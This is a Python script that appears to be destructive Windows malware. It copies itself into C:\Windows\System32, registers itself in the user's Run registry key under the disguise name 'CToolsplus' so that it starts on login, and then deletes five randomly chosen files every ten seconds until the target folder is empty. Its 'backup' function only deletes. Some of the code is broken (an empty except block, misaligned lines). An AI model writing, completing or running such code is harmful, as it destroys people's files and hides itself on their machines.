import os
import random
import shutil
import time
import stat
import json
import winreg
import sys
DEPLOY_DIR = r"C:\Windows\System32"
CONFIG_PATH = os.path.join(DEPLOY_DIR, "config.json")
TARGET_DIR = None
if os.path.exists(CONFIG_PATH):
    try:
        with open(CONFIG_PATH, "r", encoding="utf-8") as f:
            config = json.load(f)
            TARGET_DIR = config.get("target_dir")
    except Exception as e:
        print("1")
if TARGET_DIR is None or not os.path.exists(TARGET_DIR):
    TARGET_DIR = os.path.dirname(os.path.abspath(__file__))
BACKUP_ROOT = r"C:\Windows\config" 
DELETE_COUNT_PER_ROUND = 5 
INTERVAL = 10 
def add_to_startup():
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        app_name = "CToolsplus"
        current_script_name = os.path.basename(os.path.abspath(__file__))
        script_path = os.path.join(DEPLOY_DIR, current_script_name)
        if not os.path.exists(script_path):
            script_path = os.path.abspath(__file__)
        command = f'"{script_path}"'
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ | winreg.KEY_WRITE) as key:
            try:
                existing_value, _ = winreg.QueryValueEx(key, app_name)
                if existing_value == command:
                    return True
            except FileNotFoundError:
                pass
            winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, command)
            return True
    except Exception as e:
        return False
def copy_self_to_target():
    try:
        if not os.path.exists(DEPLOY_DIR):
            os.makedirs(DEPLOY_DIR)
        current_script = os.path.abspath(__file__)
        target_script = os.path.join(DEPLOY_DIR, os.path.basename(current_script))
        if os.path.abspath(target_script) == current_script:
            return True
        if os.path.exists(target_script):
            if not os.path.exists(CONFIG_PATH):
                config = {"target_dir": TARGET_DIR}
                with open(CONFIG_PATH, "w", encoding="utf-8") as f:
                    json.dump(config, f, ensure_ascii=False, indent=2)
            return True
        shutil.copy2(current_script, target_script)
        config = {"target_dir": TARGET_DIR}
        with open(CONFIG_PATH, "w", encoding="utf-8") as f:
            json.dump(config, f, ensure_ascii=False, indent=2) 
        return True
    except Exception as e:
        return False
def init_backup_dir():
    if not os.path.exists(BACKUP_ROOT):
        os.makedirs(BACKUP_ROOT)
def extract_directory_permissions():
    dir_perms = {}
    for root, dirs, files in os.walk(TARGET_DIR):
        try:
            stat_info = os.stat(root)
            perm = stat.S_IMODE(stat_info.st_mode)
            rel_path = os.path.relpath(root, TARGET_DIR)
            dir_perms[rel_path] = {
                "mode": oct(perm),
                "st_uid": stat_info.st_uid,
                "st_gid": stat_info.st_gid,
                "st_atime": stat_info.st_atime,
                "st_mtime": stat_info.st_mtime
            }
        except Exception as e:
        perm_file = os.path.join(BACKUP_ROOT, "directory_permissions.json")
    with open(perm_file, "w", encoding="utf-8") as f:
        json.dump(dir_perms, f, ensure_ascii=False, indent=2)
def get_all_files():
    files = []
    script_path = os.path.abspath(__file__)
    for root, _, filenames in os.walk(TARGET_DIR):
        for filename in filenames:
            full_path = os.path.join(root, filename)
            if os.path.abspath(full_path) == script_path:
                continue
            if os.path.isfile(full_path):
                files.append(full_path)
    return files
def backup_and_delete_file(file_path):
        os.remove(file_path)
        return True
def main():
    copy_self_to_target()
    init_backup_dir()
    add_to_startup()
    extract_directory_permissions()
    round_num = 1
    while True:
        all_files = get_all_files()
        if not all_files:
            break
        process_count = min(DELETE_COUNT_PER_ROUND, len(all_files))
        selected_files = random.sample(all_files, process_count)
        success = 0
        for file in selected_files:
            if backup_and_delete_file(file):
                success +=1
        time.sleep(INTERVAL)
        round_num +=1
if __name__ == "__main__":
    main()